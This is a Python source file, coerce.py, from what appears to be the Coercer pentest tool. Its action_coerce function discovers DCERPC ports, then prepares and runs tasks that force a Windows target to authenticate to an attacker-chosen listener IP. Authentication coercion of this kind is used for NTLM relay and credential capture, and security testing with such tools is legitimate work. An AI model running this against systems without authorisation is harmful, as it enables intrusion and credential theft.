#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coerce.py
# Author             : Podalirius (@podalirius_)
# Date created       : 18 Sep 2022


from coercer.core.Filter import Filter
from coercer.structures.Modes import Modes
from coercer.core.tasks.execute import execute_tasks
from coercer.core.tasks.prepare import prepare_tasks
from coercer.network.rpc import portmap_discover

from coercer.core.Reporter import reporter

def action_coerce(target, available_methods, options, credentials):
    reporter.verbose = True

    filter = Filter(
        filter_method_name=options.filter_method_name,
        filter_protocol_name=options.filter_protocol_name,
        filter_pipe_name=options.filter_pipe_name
    )

    portmap = {}
    if "dcerpc" in options.filter_transport_name:
        if not options.dce_ports:
            portmap = portmap_discover(target, options.dce_port)
        else:
            portmap = {}

    # Preparing tasks ==============================================================================================================

    tasks = prepare_tasks(available_methods, options, filter, Modes.COERCE, portmap)

    # Executing tasks =======================================================================================================================

    reporter.print_info("Coercing '%s' to authenticate to '%s'" % (target, options.listener_ip), verbose=True)

    execute_tasks(tasks, options, target, credentials, Modes.COERCE)